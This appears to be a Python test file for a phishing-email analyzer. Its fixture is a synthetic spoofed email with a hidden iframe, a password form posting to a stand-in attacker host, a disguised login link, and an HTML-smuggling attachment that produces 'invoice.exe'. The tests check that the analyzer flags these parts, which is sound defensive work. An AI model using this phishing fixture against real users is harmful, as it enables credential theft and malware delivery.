from phishhunter.analyzers.email_deep_engine import analyze_email_deep
from phishhunter.services.email_agent import connector_fabric, agent_manifest


def test_ultradeep_email_layers():
    data = (
        b"From: CEO <ceo@example.com>\r\n"
        b"To: analyst@example.com\r\n"
        b"Reply-To: attacker@evil.example\r\n"
        b"Date: Thu, 01 Oct 2026 10:00:00 +0000\r\n"
        b"Authentication-Results: mx.example; spf=fail dkim=fail dmarc=fail\r\n"
        b"Received: from evil.example (203.0.113.10) by mx.example; Thu, 01 Oct 2026 10:00:00 +0000\r\n"
        b"Subject: Urgent verify your account immediately\r\n"
        b"MIME-Version: 1.0\r\n"
        b"Content-Type: multipart/mixed; boundary=abc\r\n\r\n"
        b"--abc\r\nContent-Type: text/html\r\n\r\n"
        b"<html><style>iframe{display:none;color:#fff;font-size:0}</style>"
        b"<iframe width='0' height='0'></iframe>"
        b"<form action='https://evil.example/collect'><input name='password' type='password'></form>"
        b"<a href='https://safelinks.protection.outlook.com/?url=https%3A%2F%2Fevil.example%2Flogin'>Login</a>"
        b"<script>var x=atob('YQ==');</script></html>\r\n"
        b"--abc\r\nContent-Disposition: attachment; filename=invoice.html\r\n"
        b"Content-Type: text/html\r\n\r\n"
        b"<script>atob('QUFB'); new Blob([x]); download='invoice.exe'</script>\r\n"
        b"--abc--\r\n"
    )
    result = analyze_email_deep(data)
    assert result["header_graph"]["hop_count"] == 1
    assert result["deep_html"]["iframe_count"] == 1
    assert result["safe_link_decodings"][0]["destination"] == "https://evil.example/login"
    assert result["deep_attachments"][0]["html_smuggling"] is True
    assert result["framework_mapping"]["mitre_attack"]
    assert result["agent"]["status"] == "ready"
    assert result["risk_score"] >= 55


def test_email_agent_fabric_is_explicit_about_scale():
    fabric = connector_fabric()
    assert fabric["unique_open_source_tools"] >= 50
    assert fabric["connector_capabilities"] >= 500
    assert fabric["configured_connectors"] == 0
    assert agent_manifest()["human_confirmation_required"]
